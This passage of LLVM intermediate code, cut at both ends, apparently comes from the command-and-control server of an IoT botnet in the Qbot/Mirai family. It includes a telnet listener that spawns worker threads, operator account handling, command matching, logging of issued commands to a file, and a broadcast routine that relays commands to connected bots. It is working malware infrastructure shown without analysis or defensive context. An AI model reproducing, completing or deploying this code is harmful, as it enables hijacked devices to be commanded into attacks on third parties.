  %1868 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1869 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1870 = call i64 @strlen(i8* %1869) #8
  %1871 = call i64 @send(i32 %1867, i8* %1868, i64 %1870, i32 16384)
  %1872 = icmp eq i64 %1871, -1
  br i1 %1872, label %1873, label %1874

; <label>:1873:                                   ; preds = %1848
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1874:                                   ; preds = %1848
  br label %1875

; <label>:1875:                                   ; preds = %1874, %1844
  %1876 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1877 = call i8* @strstr(i8* %1876, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.180, i32 0, i32 0)) #8
  %1878 = icmp ne i8* %1877, null
  br i1 %1878, label %1879, label %1890

; <label>:1879:                                   ; preds = %1875
  %1880 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1881 = call i32 (i8*, i8*, ...) @sprintf(i8* %1880, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.181, i32 0, i32 0)) #7
  %1882 = load i32, i32* %4, align 4
  %1883 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1884 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1885 = call i64 @strlen(i8* %1884) #8
  %1886 = call i64 @send(i32 %1882, i8* %1883, i64 %1885, i32 16384)
  %1887 = icmp eq i64 %1886, -1
  br i1 %1887, label %1888, label %1889

; <label>:1888:                                   ; preds = %1879
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1889:                                   ; preds = %1879
  br label %1890

; <label>:1890:                                   ; preds = %1889, %1875
  %1891 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1892 = call i8* @strstr(i8* %1891, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0)) #8
  %1893 = icmp ne i8* %1892, null
  br i1 %1893, label %1894, label %1905

; <label>:1894:                                   ; preds = %1890
  %1895 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1896 = call i32 (i8*, i8*, ...) @sprintf(i8* %1895, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.183, i32 0, i32 0)) #7
  %1897 = load i32, i32* %4, align 4
  %1898 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1899 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1900 = call i64 @strlen(i8* %1899) #8
  %1901 = call i64 @send(i32 %1897, i8* %1898, i64 %1900, i32 16384)
  %1902 = icmp eq i64 %1901, -1
  br i1 %1902, label %1903, label %1904

; <label>:1903:                                   ; preds = %1894
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1904:                                   ; preds = %1894
  br label %1905

; <label>:1905:                                   ; preds = %1904, %1890
  %1906 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1907 = call i8* @strstr(i8* %1906, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i32 0, i32 0)) #8
  %1908 = icmp ne i8* %1907, null
  br i1 %1908, label %1909, label %1920

; <label>:1909:                                   ; preds = %1905
  %1910 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1911 = call i32 (i8*, i8*, ...) @sprintf(i8* %1910, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.185, i32 0, i32 0)) #7
  %1912 = load i32, i32* %4, align 4
  %1913 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1914 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1915 = call i64 @strlen(i8* %1914) #8
  %1916 = call i64 @send(i32 %1912, i8* %1913, i64 %1915, i32 16384)
  %1917 = icmp eq i64 %1916, -1
  br i1 %1917, label %1918, label %1919

; <label>:1918:                                   ; preds = %1909
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1919:                                   ; preds = %1909
  br label %1920

; <label>:1920:                                   ; preds = %1919, %1905
  %1921 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1922 = call i8* @strstr(i8* %1921, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.186, i32 0, i32 0)) #8
  %1923 = icmp ne i8* %1922, null
  br i1 %1923, label %1924, label %1935

; <label>:1924:                                   ; preds = %1920
  %1925 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1926 = call i32 (i8*, i8*, ...) @sprintf(i8* %1925, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.187, i32 0, i32 0)) #7
  %1927 = load i32, i32* %4, align 4
  %1928 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1929 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1930 = call i64 @strlen(i8* %1929) #8
  %1931 = call i64 @send(i32 %1927, i8* %1928, i64 %1930, i32 16384)
  %1932 = icmp eq i64 %1931, -1
  br i1 %1932, label %1933, label %1934

; <label>:1933:                                   ; preds = %1924
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1934:                                   ; preds = %1924
  br label %1935

; <label>:1935:                                   ; preds = %1934, %1920
  %1936 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1937 = call i8* @strstr(i8* %1936, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.188, i32 0, i32 0)) #8
  %1938 = icmp ne i8* %1937, null
  br i1 %1938, label %1939, label %1950

; <label>:1939:                                   ; preds = %1935
  %1940 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1941 = call i32 (i8*, i8*, ...) @sprintf(i8* %1940, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.189, i32 0, i32 0)) #7
  %1942 = load i32, i32* %4, align 4
  %1943 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1944 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1945 = call i64 @strlen(i8* %1944) #8
  %1946 = call i64 @send(i32 %1942, i8* %1943, i64 %1945, i32 16384)
  %1947 = icmp eq i64 %1946, -1
  br i1 %1947, label %1948, label %1949

; <label>:1948:                                   ; preds = %1939
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1949:                                   ; preds = %1939
  br label %1950

; <label>:1950:                                   ; preds = %1949, %1935
  %1951 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1952 = call i8* @strstr(i8* %1951, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0)) #8
  %1953 = icmp ne i8* %1952, null
  br i1 %1953, label %1954, label %1965

; <label>:1954:                                   ; preds = %1950
  %1955 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1956 = call i32 (i8*, i8*, ...) @sprintf(i8* %1955, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.191, i32 0, i32 0)) #7
  %1957 = load i32, i32* %4, align 4
  %1958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1959 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1960 = call i64 @strlen(i8* %1959) #8
  %1961 = call i64 @send(i32 %1957, i8* %1958, i64 %1960, i32 16384)
  %1962 = icmp eq i64 %1961, -1
  br i1 %1962, label %1963, label %1964

; <label>:1963:                                   ; preds = %1954
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1964:                                   ; preds = %1954
  br label %1965

; <label>:1965:                                   ; preds = %1964, %1950
  %1966 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1967 = call i8* @strstr(i8* %1966, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i32 0, i32 0)) #8
  %1968 = icmp ne i8* %1967, null
  br i1 %1968, label %1969, label %1980

; <label>:1969:                                   ; preds = %1965
  %1970 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1971 = call i32 (i8*, i8*, ...) @sprintf(i8* %1970, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.193, i32 0, i32 0)) #7
  %1972 = load i32, i32* %4, align 4
  %1973 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1974 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1975 = call i64 @strlen(i8* %1974) #8
  %1976 = call i64 @send(i32 %1972, i8* %1973, i64 %1975, i32 16384)
  %1977 = icmp eq i64 %1976, -1
  br i1 %1977, label %1978, label %1979

; <label>:1978:                                   ; preds = %1969
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1979:                                   ; preds = %1969
  br label %1980

; <label>:1980:                                   ; preds = %1979, %1965
  %1981 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1982 = call i8* @strstr(i8* %1981, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.194, i32 0, i32 0)) #8
  %1983 = icmp ne i8* %1982, null
  br i1 %1983, label %1984, label %1995

; <label>:1984:                                   ; preds = %1980
  %1985 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1986 = call i32 (i8*, i8*, ...) @sprintf(i8* %1985, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.195, i32 0, i32 0)) #7
  %1987 = load i32, i32* %4, align 4
  %1988 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1989 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1990 = call i64 @strlen(i8* %1989) #8
  %1991 = call i64 @send(i32 %1987, i8* %1988, i64 %1990, i32 16384)
  %1992 = icmp eq i64 %1991, -1
  br i1 %1992, label %1993, label %1994

; <label>:1993:                                   ; preds = %1984
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1994:                                   ; preds = %1984
  br label %1995

; <label>:1995:                                   ; preds = %1994, %1980
  %1996 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1997 = call i8* @strstr(i8* %1996, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0)) #8
  %1998 = icmp ne i8* %1997, null
  br i1 %1998, label %1999, label %2010

; <label>:1999:                                   ; preds = %1995
  %2000 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2001 = call i32 (i8*, i8*, ...) @sprintf(i8* %2000, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.197, i32 0, i32 0)) #7
  %2002 = load i32, i32* %4, align 4
  %2003 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2004 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2005 = call i64 @strlen(i8* %2004) #8
  %2006 = call i64 @send(i32 %2002, i8* %2003, i64 %2005, i32 16384)
  %2007 = icmp eq i64 %2006, -1
  br i1 %2007, label %2008, label %2009

; <label>:2008:                                   ; preds = %1999
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:2009:                                   ; preds = %1999
  br label %2010

; <label>:2010:                                   ; preds = %2009, %1995
  %2011 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2012 = call i8* @strstr(i8* %2011, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0)) #8
  %2013 = icmp ne i8* %2012, null
  br i1 %2013, label %2014, label %2025

; <label>:2014:                                   ; preds = %2010
  %2015 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2016 = call i32 (i8*, i8*, ...) @sprintf(i8* %2015, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.199, i32 0, i32 0)) #7
  %2017 = load i32, i32* %4, align 4
  %2018 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2019 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2020 = call i64 @strlen(i8* %2019) #8
  %2021 = call i64 @send(i32 %2017, i8* %2018, i64 %2020, i32 16384)
  %2022 = icmp eq i64 %2021, -1
  br i1 %2022, label %2023, label %2024

; <label>:2023:                                   ; preds = %2014
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:2024:                                   ; preds = %2014
  br label %2025

; <label>:2025:                                   ; preds = %2024, %2010
  %2026 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2027 = call i8* @strstr(i8* %2026, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.200, i32 0, i32 0)) #8
  %2028 = icmp ne i8* %2027, null
  br i1 %2028, label %2029, label %2030

; <label>:2029:                                   ; preds = %2025
  br label %265

; <label>:2030:                                   ; preds = %2025
  %2031 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2032 = call i8* @strstr(i8* %2031, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.201, i32 0, i32 0)) #8
  %2033 = icmp ne i8* %2032, null
  br i1 %2033, label %2034, label %2035

; <label>:2034:                                   ; preds = %2030
  br label %265

; <label>:2035:                                   ; preds = %2030
  %2036 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2037 = call i8* @strstr(i8* %2036, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.202, i32 0, i32 0)) #8
  %2038 = icmp ne i8* %2037, null
  br i1 %2038, label %2039, label %2040

; <label>:2039:                                   ; preds = %2035
  br label %265

; <label>:2040:                                   ; preds = %2035
  %2041 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2042 = call i8* @strstr(i8* %2041, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.203, i32 0, i32 0)) #8
  %2043 = icmp ne i8* %2042, null
  br i1 %2043, label %2044, label %2045

; <label>:2044:                                   ; preds = %2040
  br label %265

; <label>:2045:                                   ; preds = %2040
  %2046 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2047 = call i8* @strstr(i8* %2046, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.204, i32 0, i32 0)) #8
  %2048 = icmp ne i8* %2047, null
  br i1 %2048, label %2049, label %2050

; <label>:2049:                                   ; preds = %2045
  br label %2101

; <label>:2050:                                   ; preds = %2045
  %2051 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2052 = call i8* @strstr(i8* %2051, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.205, i32 0, i32 0)) #8
  %2053 = icmp ne i8* %2052, null
  br i1 %2053, label %2054, label %2055

; <label>:2054:                                   ; preds = %2050
  br label %2101

; <label>:2055:                                   ; preds = %2050
  %2056 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %2056)
  %2057 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2058 = load i32, i32* %5, align 4
  %2059 = sext i32 %2058 to i64
  %2060 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2059
  %2061 = getelementptr inbounds %struct.account, %struct.account* %2060, i32 0, i32 0
  %2062 = getelementptr inbounds [20 x i8], [20 x i8]* %2061, i32 0, i32 0
  %2063 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2064 = call i32 (i8*, i8*, ...) @sprintf(i8* %2057, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %2062, i8* %2063) #7
  %2065 = load i32, i32* %4, align 4
  %2066 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2067 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2068 = call i64 @strlen(i8* %2067) #8
  %2069 = call i64 @send(i32 %2065, i8* %2066, i64 %2068, i32 16384)
  %2070 = icmp eq i64 %2069, -1
  br i1 %2070, label %2071, label %2072

; <label>:2071:                                   ; preds = %2055
  br label %2101

; <label>:2072:                                   ; preds = %2055
  %2073 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2074 = call i64 @strlen(i8* %2073) #8
  %2075 = icmp eq i64 %2074, 0
  br i1 %2075, label %2076, label %2077

; <label>:2076:                                   ; preds = %2072
  br label %337

; <label>:2077:                                   ; preds = %2072
  %2078 = load i32, i32* %5, align 4
  %2079 = sext i32 %2078 to i64
  %2080 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2079
  %2081 = getelementptr inbounds %struct.account, %struct.account* %2080, i32 0, i32 0
  %2082 = getelementptr inbounds [20 x i8], [20 x i8]* %2081, i32 0, i32 0
  %2083 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2084 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %2082, i8* %2083)
  %2085 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %2085, %struct._IO_FILE** %111, align 8
  %2086 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2087 = load i32, i32* %5, align 4
  %2088 = sext i32 %2087 to i64
  %2089 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2088
  %2090 = getelementptr inbounds %struct.account, %struct.account* %2089, i32 0, i32 0
  %2091 = getelementptr inbounds [20 x i8], [20 x i8]* %2090, i32 0, i32 0
  %2092 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2093 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2086, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %2091, i8* %2092)
  %2094 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2095 = call i32 @fclose(%struct._IO_FILE* %2094)
  %2096 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2097 = load i32, i32* %4, align 4
  %2098 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %2096, i32 %2097, i8* %2098)
  %2099 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %2099, i8 0, i64 2048, i32 16, i1 false)
  br label %337

; <label>:2100:                                   ; preds = %337
  br label %2101

; <label>:2101:                                   ; preds = %2100, %2071, %2054, %2049, %1432, %1405, %1382, %1375, %1356, %1348, %1340, %1332, %1324, %1316, %1308, %1300, %1252, %1233, %1225, %1217, %1209, %1201, %1193, %1185, %1177, %1169, %1161, %1153, %1145, %1137, %1129, %1121, %1113, %1105, %1097, %1089, %1081, %1073, %1065, %1057, %987, %968, %960, %952, %944, %936, %894, %875, %867, %859, %851, %843, %835, %827, %819, %811, %803, %795, %787, %737, %718, %710, %702, %694, %686, %678, %670, %662, %618, %599, %591, %583, %575, %567, %559, %551, %511, %492, %484, %476, %468, %460, %452, %444, %436, %428, %420, %412, %328, %311, %303, %295, %287, %276, %271, %263, %262, %254, %246, %214, %208, %182, %176, %166
  %2102 = load i32, i32* %4, align 4
  %2103 = sext i32 %2102 to i64
  %2104 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2103
  %2105 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2104, i32 0, i32 1
  store i32 0, i32* %2105, align 4
  %2106 = load i32, i32* %4, align 4
  %2107 = call i32 @close(i32 %2106)
  %2108 = load volatile i32, i32* @managesConnected, align 4
  %2109 = add nsw i32 %2108, -1
  store volatile i32 %2109, i32* @managesConnected, align 4
  br label %2110

; <label>:2110:                                   ; preds = %2101, %2023, %2008, %1993, %1978, %1963, %1948, %1933, %1918, %1903, %1888, %1873, %1838, %1823, %1808, %1793, %1778, %1763, %1748, %1733, %1718, %1703, %1688, %1673, %1658, %1643, %1628, %1601, %1536, %1498, %1483, %1468
  %2111 = load i8*, i8** %2, align 8
  ret i8* %2111
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

declare i32 @resolve(...) #1

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.207, i32 0, i32 0))
  br label %15

; <label>:15:                                     ; preds = %14, %1
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %3, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %4, align 4
  %25 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %26 = call i32 @bind(i32 %24, %struct.sockaddr* %25, i32 16) #7
  %27 = icmp slt i32 %26, 0
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %15
  call void @perror(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.208, i32 0, i32 0))
  br label %29

; <label>:29:                                     ; preds = %28, %15
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @listen(i32 %30, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %32

; <label>:32:                                     ; preds = %69, %29
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.209, i32 0, i32 0))
  %34 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %35 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 0
  %36 = load i64, i64* %35, align 4
  %37 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 1
  %38 = load i64, i64* %37, align 4
  call void @client_addr(i64 %36, i64 %38)
  %39 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %39, %struct._IO_FILE** %9, align 8
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = and i32 %43, 255
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %46 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %45, i32 0, i32 0
  %47 = load i32, i32* %46, align 4
  %48 = and i32 %47, 65280
  %49 = lshr i32 %48, 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 4
  %53 = and i32 %52, 16711680
  %54 = lshr i32 %53, 16
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, -16777216
  %59 = lshr i32 %58, 24
  %60 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %40, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.211, i32 0, i32 0), i32 %44, i32 %49, i32 %54, i32 %59)
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %62 = call i32 @fclose(%struct._IO_FILE* %61)
  %63 = load i32, i32* %4, align 4
  %64 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %65 = call i32 @accept(i32 %63, %struct.sockaddr* %64, i32* %6)
  store i32 %65, i32* %5, align 4
  %66 = load i32, i32* %5, align 4
  %67 = icmp slt i32 %66, 0
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %32
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.212, i32 0, i32 0))
  br label %69

; <label>:69:                                     ; preds = %68, %32
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = inttoptr i64 %71 to i8*
  %73 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %72) #7
  br label %32
                                                  ; No predecessors!
  %75 = load i8*, i8** %2, align 8
  ret i8* %75
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %3
  %17 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.213, i32 0, i32 0), i8* %20)
  call void @exit(i32 1) #10
  unreachable

; <label>:22:                                     ; preds = %3
  %23 = load i8**, i8*** %6, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 3
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25) #8
  store i32 %26, i32* %10, align 4
  %27 = load i8**, i8*** %6, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29) #8
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = icmp sgt i32 %31, 1000
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %22
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.214, i32 0, i32 0))
  ret i32 0

; <label>:35:                                     ; preds = %22
  %36 = load i32, i32* %9, align 4
  %37 = icmp slt i32 %36, 1000
  br i1 %37, label %38, label %40

; <label>:38:                                     ; preds = %35
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0))
  br label %40

; <label>:40:                                     ; preds = %38, %35
  br label %41

; <label>:41:                                     ; preds = %40
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.215, i32 0, i32 0))
  %43 = load i8**, i8*** %6, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @create_and_bind(i8* %45)
  store volatile i32 %46, i32* @listenFD, align 4
